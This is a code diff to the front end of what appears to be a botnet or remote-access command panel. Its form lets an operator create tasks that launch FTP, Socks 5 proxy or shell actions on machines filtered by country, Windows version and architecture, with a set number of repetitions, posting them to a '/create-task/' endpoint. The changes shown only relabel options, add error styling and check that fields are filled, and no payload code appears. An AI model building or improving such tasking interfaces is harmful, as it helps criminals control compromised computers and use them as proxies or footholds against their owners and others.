@@ -129,7 +129,7 @@ glyphicon glyphicon-question-sign red"></i> <span class="textus">
     </table>
     <div class="task">
 <div class="inputs">
-<input type="text"  placeholder ="TASK NAME " class="boxi" name="name" id="name" required> 
+<input type="text"  placeholder ="Task name " class="boxi" name="name" id="name" required> 
 <input type="text"  placeholder ="Countries ( * for all )" class="boxim" name="" id="country">
 </div>
 
@@ -142,7 +142,7 @@ glyphicon glyphicon-question-sign red"></i> <span class="textus">
     <input type="checkbox" onclick="document.getElementById('feature2').checked = false; document.getElementById('feature3').checked = false;" id="feature1"/>
     <div>
       <span>
-       Launch FTP
+       FTP
        
       </span>
     </div>
@@ -161,7 +161,7 @@ glyphicon glyphicon-question-sign red"></i> <span class="textus">
     <input type="checkbox" onclick="document.getElementById('feature2').checked = false; document.getElementById('feature1').checked = false;" id="feature3"/>
     <div>
       <span>
-       Launch Socks5.
+       Socks 5
       </span>
     </div>
   </article>
@@ -232,13 +232,54 @@ glyphicon glyphicon-question-sign red"></i> <span class="textus">
 
 </div>
 
+<style type="text/css">
 
+.erro{
+background-color: #1f1f1f;
+width: 390px;
+margin-left: 33%;
+border-radius: 7px;
+border: 2px solid #b51f28;
+
+}
+.baton{
+background-color: #1f1f1f;
+outline: none;box-shadow: none;
+color: #939393;
+font-size: 14px;
+margin-left:95%;
+font-family: 'Manrope', sans-serif;
+}
+.textus{
+  font-size: 16px;
+      padding: 0px 4px 11px 1px;
+  color: #b9b9b9;
+  text-align: center;
+  font-family: 'Manrope', sans-serif;
+}
+
+@media only screen and (max-width: 1032px) {
+.erro{
+
+margin-left: 42%;
+}
+.textues{
+font-size: 11px;
+color:#bababa;
+}
+ }
+</style>
+
+<div class="task">
+        <div id="errore-input" class="erro" style="display: none;"><a class="baton"  onclick="(document.getElementById('errore-input').style.display='none')">x</a>
+    <p class="textus"> The input value should not be empty.</p>
+</div>
 
 <div class="posledn">
 
 <form class="gehueu">
             <p>
-                <label for="age"> repetitions: </label>
+                <label for="age"> Repetitions: </label>
                 <input class="dobus" type="number" step="1" min="1" max="100" value="1" id="age" name="age"/>
             </p>
           
@@ -298,6 +339,8 @@ background-color: red;
         name = document.getElementById('name').value;
         country = document.getElementById('country').value;
 
+        
+
         reps = document.getElementById('age').value;
 
         if (ftp == true) {
@@ -319,11 +362,20 @@ background-color: red;
         x32 = document.getElementById('make-bed-1').checked
         x64 = document.getElementById('clean-teeth-1').checked
 
+        if (name == '' || country == '' || all_win == false && (win7 == false && win8 == false && win81 == false && win10 == false && win11 == false) || x32_64 == false && (x32 == false && x64 == false) || (ftp == false && shell == false && sock == false)){
+            document.getElementById('errore-input').style.display = ''
+            return
+        }
+        
+
         $.ajax({
             url: '/create-task/', 
             type: 'post',
             data: {reps: reps, type: _type, name: name, country: country, all_win: all_win, win7: win7, win8: win8, win10: win10, win11: win11, win81: win81, x32_64: x32_64, x32: x32, x64: x64},
             dataType: 'html',
+            success: function(data){
+                window.location.href = '/admin-panel/'
+            }
         })
     }
 
